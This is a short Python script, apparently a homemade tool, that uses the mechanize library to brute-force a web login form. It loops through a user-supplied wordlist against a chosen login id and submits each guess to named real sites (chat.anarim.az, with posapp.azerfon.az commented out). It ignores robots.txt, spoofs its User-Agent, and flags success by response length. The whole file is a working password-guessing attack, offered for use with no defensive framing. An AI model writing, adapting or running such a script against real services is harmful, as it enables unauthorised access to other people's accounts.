from mechanize import Browser
import re
import mechanize

cookie = mechanize.CookieJar()
print(cookie)
browser = Browser()
browser.set_handle_equiv(True)
browser.set_handle_gzip(True)
browser.set_handle_redirect(True)
browser.set_handle_referer(True)
browser.set_handle_robots(False)
browser.set_cookiejar(cookie)
browser._factory.is_html = True
wl = input("Wordlist: ")
w = open(wl,"r")
wordlist = w.read().splitlines()
# for i in browser.forms():
#     print(f"\n{i}")

login = input("Login or id: ")

# browser.form = browser.global_form()
def attack(id, password):

    browser.addheaders = [("User-Agent","Mozilla"),("Accept","text/javascript")]
    # response = browser.open('https://posapp.azerfon.az/#/session/signin')
    response = browser.open('https://chat.anarim.az')

    browser.select_form(nr=0)
    browser.form['us'] = id
    browser.form['ps'] = password

    browser.method = "POST"
    submit = browser.submit()
    # print(browser.forms())
    # print (response.code)
    # print(type(response.get_data()))
    f = open("test.html","wb")
    resp_data = browser.response().read()
    resp_length = len(resp_data)
    if(resp_length > 4000):
        print("\nParol dogrudur")
        print(f"[{id}]")
        print(f"[{password}]")
    else:
        print("----------------\n")
    f.write(resp_data)
count = 1
for wordlist in wordlist:
    print(f"[{count}] - [{wordlist}]")
    attack(login,wordlist)
    count+=1
